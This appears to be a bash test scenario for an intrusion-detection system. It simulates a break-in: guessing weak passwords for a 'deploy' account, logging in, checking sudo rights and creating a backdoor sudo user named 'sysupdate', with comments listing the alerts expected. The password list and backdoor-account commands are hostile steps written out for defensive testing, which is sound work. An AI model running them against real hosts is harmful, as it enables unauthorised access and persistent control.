#!/bin/bash
# A break-in from 172.30.0.77: the attacker guesses the deploy account's weak
# password, logs in, checks its privileges and creates a backdoor sudo user.
# Expected: brute force (high, because it then logged in), possible breach
# (high), account change (high, made from the breached session).
source /scenarios/lib.sh

readonly WRONG=(root:toor root:123456 deploy:deploy deploy:deploy123 deploy:Password1 deploy:Welcome1
  deploy:Spring2026! deploy:Autumn2025! deploy:Winter2025! deploy:Summer2025!)

log "${#WRONG[@]} wrong guesses"
for guess in "${WRONG[@]}"; do
  try_password "${guess%%:*}" "${guess#*:}" >/dev/null 2>&1 || true
done

log "the right password, then a backdoor account"
try_password deploy 'Summer2026!' "echo 'Summer2026!' | sudo -S -p '' /usr/bin/id
  sleep 2
  echo 'Summer2026!' | sudo -S -p '' /usr/sbin/useradd -m -s /bin/bash -G sudo sysupdate
  sleep 2"
log done
